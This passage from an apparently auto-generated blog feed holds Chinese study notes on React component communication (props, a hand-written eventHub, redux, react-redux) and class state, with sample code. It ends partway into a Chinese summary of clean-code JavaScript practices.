        <content type="html"><![CDATA[<h4 id="上文我们已经用自己的-eventHub-来完成了任意组件之间的通讯，接下来我们使用-redux-来达到相同的功能。"><a href="#上文我们已经用自己的-eventHub-来完成了任意组件之间的通讯，接下来我们使用-redux-来达到相同的功能。" class="headerlink" title="上文我们已经用自己的 eventHub 来完成了任意组件之间的通讯，接下来我们使用 redux 来达到相同的功能。"></a><a href="https://www.jianshu.com/p/6acecc5ef433">上文</a>我们已经用自己的 <code>eventHub</code> 来完成了任意组件之间的通讯，接下来我们使用 <code>redux</code> 来达到相同的功能。</h4><p>直接看官网的例子，我们直接开始改写<a href="http://js.jirengu.com/pisak/6/edit?js,output">这样</a></p><p><img src="/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E5%9B%9B%EF%BC%9Aredux%E5%92%8Creact-redux/index/img.png"></p><blockquote><p>可以看到思路和我们的 <code>eventHub</code> 差不多，只不过 <code>redux</code> 使用了更多新名词（吐槽…）订阅事件用 <code>subscribe</code> ， 触发事件用 <code>dispatch</code>，触发事件的名字用 <code>type</code> ，传递的参数为 <code>payload</code>。</p></blockquote><p>虽然我们现在已经用 <code>redux</code> 来改写了这个例子，但是这个方法还是不够优雅，</p><p>我们在改变数据的时候，还是需要数据一层一层的往下传，对比于最早的 <code>props</code> 只是少了一层一层往上传而已，但是这始终还是没有解决问题。</p><h4 id="所以为了解决这个问题，于是我们现在要使用-react-redux-再来改造这个例子"><a href="#所以为了解决这个问题，于是我们现在要使用-react-redux-再来改造这个例子" class="headerlink" title="所以为了解决这个问题，于是我们现在要使用 react-redux 再来改造这个例子"></a>所以为了解决这个问题，于是我们现在要使用 <strong>react-redux</strong> 再来改造这个例子</h4><p>整体依旧不变，我们只是为了解决一层一层往下传递的问题，所以我们只需要用 <code>Provider</code> 把 <code>App</code> 包起来，在用 <code>connect</code> 连接子组件即可。</p><p><a href="http://js.jirengu.com/xusoh/6/edit?js,output">完整结果看这里</a></p><p><img src="/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E5%9B%9B%EF%BC%9Aredux%E5%92%8Creact-redux/index/img_1.png"></p><blockquote><p>对比用 <code>redux</code> ，<code>react-redux</code> 不需要在额外去订阅 <code>render</code> 函数，不需要再通过 <code>props</code> 一层一层的去传递数据，只需要用 <code>Provider</code> 将 <code>App</code> 组件包装，再用 <code>connect</code> 将子组件包装即可使用。</p></blockquote><p>在这个栗子中我们得以看出：</p><blockquote><p>我们通过 <code>&lt;ReactRedux.Provider store=&#123;store&#125;&gt;&lt;App /&gt;&lt;/ReactRedux.Provider&gt;</code> 把 <code>App</code> 包起来之后，我们只需再在组件内使用 <code>ReactRedux.connect</code> 这个 <code>API</code>，然后在第一个括号里，传入 <code>mapStateToProps</code> 和 <code>mapDispatchToProps</code> 这两个变量以后，我们就能直接在组建内使用 <code>props.数据</code> 使用，这样就避免了最初通过 <code>props</code> 一层一层的传递数据。</p></blockquote><p>ps：又多学了两个 <code>API</code> ：）（手动狗头）</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高效学习 react 笔记三：组件通讯-eventHub</title>
      <link href="/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%89%EF%BC%9A%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF-eventHub/index/"/>
      <url>/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%89%EF%BC%9A%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF-eventHub/index/</url>
      
        <content type="html"><![CDATA[<ul><li><h3 id="1-任意两个组件之间如何通信"><a href="#1-任意两个组件之间如何通信" class="headerlink" title="1.  任意两个组件之间如何通信"></a>1.  任意两个组件之间如何通信</h3></li><li><h3 id="2-发布订阅模式"><a href="#2-发布订阅模式" class="headerlink" title="2. 发布订阅模式"></a>2. 发布订阅模式</h3></li><li><h3 id="3-Redux-就那么回事"><a href="#3-Redux-就那么回事" class="headerlink" title="3. Redux 就那么回事"></a>3. Redux 就那么回事</h3></li></ul><p><a href="https://www.jianshu.com/p/5c22d3908b41">上篇文章</a>说到了组件传值可以通过 <code>props</code> 来传值，</p><p>但是当我们遇到<strong>嵌套组件很深的时候或者任意组件通讯的时候</strong>，</p><p>比如说<a href="http://js.jirengu.com/keveb/4/edit?js,output">这个时候</a></p><p><img src="/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%89%EF%BC%9A%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF-eventHub/index/img.png"></p><blockquote><p>当我们点击 <code>minus</code> 的时候只有当前组件的数据在变化，但是我们希望这个数据在变化的时候通知其他组件同时变化，所以，如果继续用 <code>props</code> 父子组件传递的思路的话，将会是下面这个样子。</p></blockquote><p><img src="/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%89%EF%BC%9A%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF-eventHub/index/img_1.png"></p><blockquote><p>蓝色箭头表明了数据流向，这种层层传递非常麻烦，而且很容易出现错误。</p></blockquote><h5 id="所以-eventHub-就派上了用场。"><a href="#所以-eventHub-就派上了用场。" class="headerlink" title="所以 eventHub 就派上了用场。"></a>所以 <code>eventHub</code> 就派上了用场。</h5><p>正因为 <code>React</code> 是单向数据流，所以我们只能通过 <code>eventHub</code> 来传递数据</p><p>直接上手写一个 <code>eventHub</code> （即发布订阅模式）</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// （暂时忽略一些细节）</span></span><br><span class="line"><span class="keyword">const</span> eventHub = &#123;</span><br><span class="line">  <span class="keyword">data</span>: &#123;&#125;,</span><br><span class="line">  eventLists: &#123;&#125;,</span><br><span class="line">  on(name, fn) &#123;</span><br><span class="line">    (<span class="keyword">this</span>.eventLists[name]</span><br><span class="line">      ? <span class="keyword">this</span>.eventLists[name]</span><br><span class="line">      : (<span class="keyword">this</span>.eventLists[name] = [])</span><br><span class="line">    ).push(fn);</span><br><span class="line">  &#125;,</span><br><span class="line">  off(name, fn) &#123;</span><br><span class="line">    <span class="keyword">const</span> index = <span class="keyword">this</span>.eventLists[name].findIndex(v =&gt; v === fn);</span><br><span class="line">    <span class="keyword">this</span>.eventLists[name].splice(index, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.eventLists[name].length === <span class="number">0</span>) &#123;</span><br><span class="line">      delete <span class="keyword">this</span>.eventLists[name];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  trigger(name, ...arg) &#123;</span><br><span class="line">    <span class="keyword">this</span>.eventLists[name].map(fn =&gt; fn.call(<span class="literal">null</span>, ...arg));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>利用这个简陋的 <code>eventHub</code> 我们就可以<a href="http://js.jirengu.com/jexujedopa/4/edit?js,output">实现</a>任意组件的通讯</p><p><img src="/Blog/2019/06/23/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%89%EF%BC%9A%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF-eventHub/index/img_2.png"></p><blockquote><p>可以看到在这个例子中，我们的数据还是通过 <code>props</code> 传递，但是我们在最上面已经提前发布了事件，之后只需要在组件中调用即可，从中还是遵循着单项数据流的原则。</p></blockquote><p>好了，我们已经用自己的 <code>eventHub</code> 来实现了任意组件的通讯，</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高效学习 react 笔记二：组件通讯-props</title>
      <link href="/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%BA%8C%EF%BC%9A%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF-props/index/"/>
      <url>/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%BA%8C%EF%BC%9A%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF-props/index/</url>
      
        <content type="html"><![CDATA[<h2 id="父传子"><a href="#父传子" class="headerlink" title="父传子"></a>父传子</h2><h5 id="通过-props-传递"><a href="#通过-props-传递" class="headerlink" title="通过 props 传递"></a>通过 <code>props</code> 传递</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;props.name&#125; // 这里就是儿子接受到父亲传递的数据</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Son</span> <span class="attr">name</span>=<span class="string">&quot;我是父亲：这是传递的数据&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">Father</span> /&gt;</span></span>, <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#app&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="子传父"><a href="#子传父" class="headerlink" title="子传父"></a>子传父</h2><h5 id="通过调用-props-上的回调函数"><a href="#通过调用-props-上的回调函数" class="headerlink" title="通过调用 props 上的回调函数"></a>通过调用 <code>props</code> 上的回调函数</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;props.name(&#x27;我是儿子：这是传递的数据&#x27;)&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fn</span> (data) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data) <span class="comment">// 这是父亲接收到儿子传递数据的地方</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Son</span> <span class="attr">name</span>=<span class="string">&#123;fn&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">Father</span> /&gt;</span></span>, <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#app&#x27;</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高效学习 react 笔记一：为什么要使用 class</title>
      <link href="/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8class/index/"/>
      <url>/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8class/index/</url>
      
        <content type="html"><![CDATA[<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>如果我们写一个功能复杂的页面，都写在 js 里，那么你的文件将会变成<a href="https://jsbin.com/kenayey/edit?html,js,output">下面这个样子</a>：</p><p><img src="/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8class/index/img.png"></p><p><code>render</code> 函数里面将会有一坨的代码，非常不优雅<br>但是此时就有一个奇怪的现象，为什么同样的 <code>html</code> 代码写在 <code>html</code> 文件里面就不会觉得丑呢？<br>因为国际惯例认为习惯， <code>js</code> 文件一般不会这么复杂，所以产生了组件的概念。</p><p>我们把<a href="https://jsbin.com/zenowac/edit?html,js,output">代码分开</a>（为做演示，先暂时放在一个文件里面）</p><p><img src="/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8class/index/img_1.png"></p><p>但是此时遇到一个 <code>bug</code> 当我点击 <code>➕1</code> 的时候，两个组件同时加了1：</p><p><img src="/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8class/index/img_2.png"></p><p>让我们来整理一下逻辑：点击 <code>➕1</code> 以后，变量 <code>number</code> 加1，接着执行 <code>render</code> 函数，<code>box1</code> 和 <code>box2</code> 同时重新渲染，因为用的同一个变量 <code>number</code> 所以结果就是两个组件同时加上了1。</p><p>所以我们<a href="https://jsbin.com/nagofet/edit?html,js,output">试试</a>给他们两个组件各自的变量和函数。</p><p><img src="/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8class/index/img_3.png"></p><p>虽然解决了 “bug”， 但是变成了这个样子，代码已经惨不忍睹了（全局变量太多了）。</p><p>此时能不能用<strong>函数传参</strong>试试呢，在 <code>react</code> 里面也就是 <code>props</code>，<br>让我们先试试用<a href="https://jsbin.com/yelivix/edit?html,js,output">函数传参</a>把~<br>我们给这两个组件各自的名字</p><p><img src="/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8class/index/img_4.png"></p><p>通过函数传参，我们分别给这两个组件各自的名字，<br>这也就是 <code>react</code> 另一个聪明之处，<strong>他把属性理解为对象的key和value</strong>，与js的对象完美对应起来了，<br>既然可以传 <code>name</code> 了，那我们能不能现在传 <code>number</code> 呢？</p><blockquote><p>答案是不行。因为 <code>react</code> 规定，永远不要试图去改变别人船费你的 <code>props</code>。</p></blockquote><p>但是这该怎么办呢？我们怎么优雅的给这两个组件各自的 <code>number</code> 呢？</p><h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><blockquote><p>js 里面有什么东西又能满足函数的功能，又可以有自己的作用域、变量 呢</p></blockquote><p>###<strong>于是这里就用上了 <code>class</code></strong></p><p>试图用 <code>class</code> <a href="https://jsbin.com/yelivix/edit?html,js,output">改写</a>刚刚的代码</p><p><img src="/Blog/2019/06/16/react/%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0react%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8class/index/img_5.png"></p><blockquote><p><code>react</code> 规定，变量<strong>必须</strong>放在 <code>this.state</code> 里面，更改变量<strong>必须</strong>通过 <code>this.setState</code> 方法，否则无法自动更新dom。</p></blockquote><blockquote><p><strong>注意</strong> <code>this.setState</code> 有可能是异步的，所以你无法像这样写 <code>➕2</code> 的代码</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">clickAdd()&#123;</span><br><span class="line">    this.<span class="built_in">set</span>State(&#123;</span><br><span class="line">      number: this.<span class="keyword">state</span>.number + <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">    this.<span class="built_in">set</span>State(&#123;</span><br><span class="line">      number: this.<span class="keyword">state</span>.number + <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>此时你应当使用 <code>this.setState</code> 的回调函数形式</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">this.<span class="built_in">set</span>State(&#123;</span><br><span class="line">  number: this.<span class="keyword">state</span>.number + <span class="number">1</span></span><br><span class="line">&#125;)</span><br><span class="line">this.<span class="built_in">set</span>State((<span class="keyword">state</span>) =&gt; &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    number: <span class="keyword">state</span>.number + <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote><p>本文完。</p><blockquote><p>再续</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/react/16.9.0/umd/react.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/react-dom/16.9.0/umd/react-dom.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>继续使用 hooks <a href="https://jsbin.com/vanuceneti/1/edit?html,js,output">改写</a></p><p>再来看一个<a href="https://jsbin.com/ruyudacuyu/1/edit?html,js,output">平平无奇的表单</a><br>来封装一个<a href="https://jsbin.com/mopogevuye/1/edit?html,js,output">hooks 版本</a>的表单把</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>clean-code-javascript</title>
      <link href="/Blog/2019/06/12/essay/clean-code-javascript/index/"/>
      <url>/Blog/2019/06/12/essay/clean-code-javascript/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2019/06/12/essay/clean-code-javascript/index/img.png"></p><p>#变量</p><ul><li><h4 id="使用有意义且能发音的单词"><a href="#使用有意义且能发音的单词" class="headerlink" title="使用有意义且能发音的单词"></a>使用有意义且能发音的单词</h4></li></ul><h6 id="Bad"><a href="#Bad" class="headerlink" title="Bad:"></a>Bad:</h6><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const yyyymmdstr <span class="operator">=</span> moment().format(<span class="string">&quot;YYYY/MM/DD&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h6 id="Good"><a href="#Good" class="headerlink" title="Good:"></a>Good:</h6><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const currentDate <span class="operator">=</span> moment().format(<span class="string">&quot;YYYY/MM/DD&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="使用可以搜索的单词"><a href="#使用可以搜索的单词" class="headerlink" title="使用可以搜索的单词"></a>使用可以搜索的单词</h4></li></ul><h6 id="Bad-1"><a href="#Bad-1" class="headerlink" title="Bad:"></a>Bad:</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// What the heck is 86400000 for?</span></span><br><span class="line">set<span class="constructor">Timeout(<span class="params">blastOff</span>, 86400000)</span>;</span><br></pre></td></tr></table></figure><h6 id="Good-1"><a href="#Good-1" class="headerlink" title="Good:"></a>Good:</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Declare them as capitalized named constants.</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MILLISECONDS_IN_A_DAY</span> = <span class="number">86400000</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(blastOff, <span class="variable constant_">MILLISECONDS_IN_A_DAY</span>);</span><br></pre></td></tr></table></figure><ul><li><h4 id="使用解释说明的单词"><a href="#使用解释说明的单词" class="headerlink" title="使用解释说明的单词"></a>使用解释说明的单词</h4></li></ul><h6 id="Bad-2"><a href="#Bad-2" class="headerlink" title="Bad:"></a>Bad:</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> address = <span class="string">&quot;One Infinite Loop, Cupertino 95014&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> cityZipCodeRegex = <span class="regexp">/^[^,\\]+[,\\\s]+(.+?)\s*(\d&#123;5&#125;)?$/</span>;</span><br><span class="line"><span class="title function_">saveCityZipCode</span>(</span><br><span class="line">  address.<span class="title function_">match</span>(cityZipCodeRegex)[<span class="number">1</span>],</span><br><span class="line">  address.<span class="title function_">match</span>(cityZipCodeRegex)[<span class="number">2</span>]</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h6 id="Good-2"><a href="#Good-2" class="headerlink" title="Good:"></a>Good:</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> address = <span class="string">&quot;One Infinite Loop, Cupertino 95014&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> cityZipCodeRegex = <span class="regexp">/^[^,\\]+[,\\\s]+(.+?)\s*(\d&#123;5&#125;)?$/</span>;</span><br><span class="line"><span class="keyword">const</span> [, city, zipCode] = address.<span class="title function_">match</span>(cityZipCodeRegex) || [];</span><br><span class="line"><span class="title function_">saveCityZipCode</span>(city, zipCode);</span><br></pre></td></tr></table></figure><ul><li><h4 id="不要增加多余的上下文"><a href="#不要增加多余的上下文" class="headerlink" title="不要增加多余的上下文"></a>不要增加多余的上下文</h4></li></ul><h6 id="Bad-3"><a href="#Bad-3" class="headerlink" title="Bad:"></a>Bad:</h6><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Car = &#123;</span><br><span class="line">  carMake: <span class="string">&quot;Honda&quot;</span>,</span><br><span class="line">  carModel: <span class="string">&quot;Accord&quot;</span>,</span><br><span class="line">  carColor: <span class="string">&quot;Blue&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">paintCar</span><span class="params">(car)</span> &#123;</span><br><span class="line">  car.carColor = <span class="string">&quot;Red&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Good-3"><a href="#Good-3" class="headerlink" title="Good:"></a>Good:</h6><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const Car = &#123;</span><br><span class="line">  make: <span class="string">&quot;Honda&quot;</span>,</span><br><span class="line">  model: <span class="string">&quot;Accord&quot;</span>,</span><br><span class="line">  <span class="built_in">color</span>: <span class="string">&quot;Blue&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">paintCar</span><span class="params">(car)</span> &#123;</span></span><br><span class="line">  car.<span class="built_in">color</span> = <span class="string">&quot;Red&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="使用默认参数"><a href="#使用默认参数" class="headerlink" title="使用默认参数"></a>使用默认参数</h4></li></ul><h6 id="Bad-4"><a href="#Bad-4" class="headerlink" title="Bad:"></a>Bad:</h6><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createMicrobrewery</span><span class="params">(name)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> breweryName = name || <span class="string">&quot;Hipster Brew Co.&quot;</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Good-4"><a href="#Good-4" class="headerlink" title="Good:"></a>Good:</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> create<span class="constructor">Microbrewery(<span class="params">name</span> = <span class="string">&quot;Hipster Brew Co.&quot;</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><ul><li><h4 id="参数（最好不超过两个）"><a href="#参数（最好不超过两个）" class="headerlink" title="参数（最好不超过两个）"></a>参数（最好不超过两个）</h4></li></ul><blockquote><p>一个或两个参数是理想的情况，如果可能的话应该避免三个。<br>应该整合除此之外的任何东西。<br>通常，如果你有两个以上的参数，那么你的函数试图做太多（秉承一个函数做一件事）。</p></blockquote><h6 id="Bad-5"><a href="#Bad-5" class="headerlink" title="Bad:"></a>Bad:</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> create<span class="constructor">Menu(<span class="params">title</span>, <span class="params">body</span>, <span class="params">buttonText</span>, <span class="params">cancellable</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Good-5"><a href="#Good-5" 